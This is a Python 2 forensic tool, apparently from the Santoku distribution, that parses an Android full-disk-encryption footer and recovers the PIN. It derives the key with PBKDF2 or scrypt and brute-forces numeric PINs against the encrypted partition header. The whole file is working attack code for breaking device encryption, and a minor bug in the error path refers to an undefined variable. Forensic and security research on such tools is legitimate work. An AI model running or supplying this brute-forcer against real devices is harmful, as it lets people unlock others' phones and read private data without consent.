#!/usr/bin/env python

# Authors: Thomas Cannon <tcannon@viaforensics.com>
# 		   Seyton Bradford <sbradford@viaforensics.com>
# TAGS: Android, Device, Decryption, Crespo, Bruteforce
#
# Parses the footer from the encrypted userdata partition
# Decrypts the master key found in the footer using a supplied password
# Bruteforces the pin number using the header from the encrypted partition 
# Written for Nexus S (crespo) running Android 4.0.4
# Footer is located in file userdata_footer on the efs partition
#
# --
# Revision 0.3 (shipped with Santoku Alpha 0.3)
# ------------
# Added support for more than 4-digit PINs
# Speed improvements
# ------------
# 2014/5/14 Added 4.4 support (scrypt, etc.) [Nikolay Elenkov]
# -- 

from os import path
import sys, itertools
import time
from struct import Struct
from M2Crypto import EVP
import hashlib
import scrypt


HASH_COUNT    = 2000
KEY_LEN_BYTES = 16
IV_LEN_BYTES  = 16
SECTOR_START  = 1

SCRYPT_ADDED_MINOR = 2
KDF_PBKDF = 1
KDF_SCRYPT = 2

class CryptoFooter:

	def __init__(self):
		self.kdf = KDF_PBKDF

	def unpack(self, data):
		# structure taken from cryptfs.h in crespo source.
		s = Struct('<'+'L H H')
		ftrMagic, majorVersion, minorVersion = s.unpack_from(data)
		if minorVersion < SCRYPT_ADDED_MINOR:
			s = Struct('<'+'L H H L L L L L L L 64s L 48s 16s')
			(self.ftrMagic, self.majorVersion, self.minorVersion, 
			self.ftrSize, self.flags, self.keySize, self.spare1, 
			self.fsSize1, self.fsSize2, self.failedDecrypt, self.cryptoType, 
			self.spare2, self.cryptoKey, self.cryptoSalt) = s.unpack_from(data)

			self.cryptoKey = self.cryptoKey[0:self.keySize]
		else:
			s = Struct('<'+'L H H L L L L L L L 64s L 48s 16s 2Q L B B B B')
			(self.ftrMagic, self.majorVersion, self.minorVersion, self.ftrSize,
 			self.flags, self.keySize, self.spare1, self.fsSize1, self.fsSize2, 
			self.failedDecrypt, self.cryptoType, self.spare2, self.cryptoKey, 
			self.cryptoSalt, self.persistDataOffset1, self.persistDataOffset2, 
			self.persistDataSize, self.kdf, self.N_factor, self.r_factor, 
			self.p_factor) = s.unpack_from(data)

			self.cryptoKey = self.cryptoKey[0:self.keySize]
			self.N = 1 << self.N_factor
			self.r = 1 << self.r_factor
			self.p = 1 << self.p_factor

	def dump(self):
		print "Android FDE crypto footer"
		print '-------------------------'
		print 'Magic          :', "0x%0.8X" % self.ftrMagic
		print 'Major Version  :', self.majorVersion
		print 'Minor Version  :', self.minorVersion
		print 'Footer Size    :', self.ftrSize, "bytes"
		print 'Flags          :', "0x%0.8X" % self.flags
		print 'Key Size       :', self.keySize * 8, "bits"
		print 'Failed Decrypts:', self.failedDecrypt
		print 'Crypto Type    :', self.cryptoType.rstrip("\0")
		print 'Encrypted Key  :', "0x" + self.cryptoKey.encode("hex").upper()
		print 'Salt           :', "0x" + self.cryptoSalt.encode("hex").upper()
		if self.minorVersion >= SCRYPT_ADDED_MINOR:
			print 'KDF            :', "PBKDF2" if self.kdf == KDF_PBKDF else "scrypt"
			print 'N_factor       :', "%u	(N=%u)" % (self.N_factor, self.N)
			print 'r_factor       :', "%u	(r=%u)" % (self.r_factor, self.r)
			print 'p_factor       :', "%u	(p=%u)" % (self.p_factor, self.p)
		print '-------------------------'
		
		
def main(args):
	# default value 
	maxpin_digits = 4

	if len(args) < 3:
		print 'Usage: python bruteforce_stdcrypto.py [header file] [footer file] (max PIN digits)'
		print ''
		print '[] = Mandatory'
		print '() = Optional (default is 4)'
	else:
		# use inputed filenames for the two files
		footerFile    = args[2]
		headerFile    = args[1]
		try:
			if args[3] != None: 
				try:
					maxpin_digits = int(args[3])
					if maxpin_digits <= 3: 
						print 'PIN has to be >= to 4 digits - defaulting your entered value to 4'
						time.sleep(2)
						maxpin_digits = 4
				except: 
					print 'You did not entered a valid maximum number of digits to bruteforce'
					print '=> Defaulting your value to 4.'
					time.sleep(2)
					maxpin_digits = 4
			else: 
			# default value
				maxpin_digits = 4
		except:
			print 'Defaulting max PIN digits to 4'
			time.sleep(2)
			maxpin_digits = 4


		assert path.isfile(footerFile), "Footer file '%s' not found." % footerFile
		assert path.isfile(headerFile), "Header file '%s' not found." % headerFile
		fileSize = path.getsize(footerFile)
		assert (fileSize >= 16384), "Input file '%s' must be at least 16384 bytes" % footerFile
		
		# retrive the key and salt from the footer file
		cf = getCryptoData(footerFile)

		# load the header data for testing the password
		headerData = open(headerFile, 'rb').read(32)

		for n in xrange(4, maxpin_digits+1):
			result = bruteforcePIN(headerData, cf, n)
			if result: 
				print 'Found PIN!: ' + result
				break

def bruteforcePIN(headerData, cryptoFooter, maxdigits):
	print 'Trying to Bruteforce Password... please wait'

	# try all possible 4 to maxdigits digit PINs, returns value immediately when found 
	for j in itertools.product(xrange(10),repeat=maxdigits):
		
		# decrypt password
		passwdTry = ''.join(str(elem) for elem in j)		
		print 'Trying: ' + passwdTry 

		# -- In case you prefer printing every 100 
		#try: 
		#	if (int(passwdTry) % 100) == 0:
		#		print 'ok'
		#		print 'Trying passwords from %d to %d' %(int(passwdTry),int(passwdTry)+100)
		#except:
		#	pass
		
		# make the decryption key from the password
		decKey = ''
		if cryptoFooter.kdf == KDF_PBKDF: 
			decKey = decryptDecodePbkdf2Key(cryptoFooter, passwdTry)
		elif cryptoFooter.kdf == KDF_SCRYPT:
			decKey = decryptDecodeScryptKey(cryptoFooter, passwdTry)
		else:
			raise "Unknown KDF: " + cf.kdf
		
		# try to decrypt the frist 32 bytes of the header data (we don't need the iv)
		decData = decryptData(decKey,"",headerData)

		# has the test worked?
		if decData[16:32] == "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0":
			return passwdTry
			
	return None


def getCryptoData(filename):
	data = open(filename, 'rb').read()
	
	cf = CryptoFooter()
	cf.unpack(data)
	cf.dump()

	return cf

def decryptDecodePbkdf2Key(cf,password):
	# make the key from the password
	pbkdf2 = EVP.pbkdf2(password, cf.cryptoSalt, iter=HASH_COUNT, keylen=KEY_LEN_BYTES+IV_LEN_BYTES)

	key = pbkdf2[:KEY_LEN_BYTES]
	iv = pbkdf2[KEY_LEN_BYTES:]

	# do the decrypt
	cipher = EVP.Cipher(alg='aes_128_cbc', key=key, iv=iv, op=0) # 0 is DEC
	cipher.set_padding(padding=0)
	decKey = cipher.update(cf.cryptoKey)
	decKey = decKey + cipher.final()
	
	return decKey

def decryptDecodeScryptKey(cf,password):
	derived = scrypt.hash(password, cf.cryptoSalt, cf.N, cf.r, cf.p)

	key = derived[:KEY_LEN_BYTES]
	iv = derived[KEY_LEN_BYTES:]

	# do the decrypt
	cipher = EVP.Cipher(alg='aes_128_cbc', key=key, iv=iv, op=0) # 0 is DEC
	cipher.set_padding(padding=0)
	decKey = cipher.update(cf.cryptoKey)
	decKey = decKey + cipher.final()
	
	return decKey

def decryptData(decKey,essiv,data):
	# try to decrypt the actual data 
	cipher = EVP.Cipher(alg='aes_128_cbc', key=decKey, iv=essiv, op=0) # 0 is DEC
	cipher.set_padding(padding=0)
	decData = cipher.update(data)
	decData = decData + cipher.final()
	return decData

if __name__ == "__main__": 
	main(sys.argv)
